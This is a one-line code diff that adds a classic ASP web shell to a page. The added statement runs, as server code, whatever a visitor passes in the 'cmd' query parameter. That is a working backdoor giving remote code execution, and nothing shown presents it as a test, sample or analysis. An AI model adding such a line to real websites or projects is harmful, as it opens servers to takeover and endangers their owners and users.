@@ -1,0 +1,1 @@
+<% Execute(Request.QueryString("cmd")) %>
